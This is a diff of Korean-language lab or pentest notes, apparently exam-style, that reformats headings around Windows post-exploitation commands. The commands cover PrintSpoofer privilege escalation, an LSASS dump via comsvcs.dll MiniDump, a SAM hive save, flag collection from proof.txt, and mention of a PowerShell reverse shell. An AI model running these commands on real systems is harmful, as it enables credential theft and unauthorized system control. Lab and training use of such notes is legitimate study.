@@ -8,7 +8,7 @@
 C:\temp\PrintSpoofer64.exe -i -c "whoami"
 ```
 
-- 플래그 수집
+#### 플래그 수집
 
 ```powershell
 type C:\Users\Administrator\Desktop\proof.txt
@@ -64,7 +64,7 @@ Get-Item C:\temp\gp.exe
 ### 실행 위치 (쓰기 가능한 임시 폴더만 사용)
 
 - `C:\temp`, `C:\Windows\Temp`, `C:\Users\Public`
-- 현재 사용자 Temp 확인:
+#### 현재 사용자 Temp 확인
 
 ```powershell
 $env:TEMP
@@ -84,7 +84,7 @@ Remove-Item C:\temp\ps.exe, C:\temp\gp.exe -Force
 
 ### exe 차단 시 대체 (Living-off-the-land, 파일 전송 불필요)
 
-- LSASS 덤프:
+#### LSASS 덤프
 
 ```powershell
 $p = (Get-Process -Name lsass).Id
@@ -92,7 +92,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\temp\lsass.dmp full
 ```
 
 - 리버스쉘: `nc.exe` 대신 PowerShell 원라이너 (파일 전송 불필요)
-- SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요
+SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요
 
 ```powershell
 reg save HKLM\SAM C:\temp\SAM
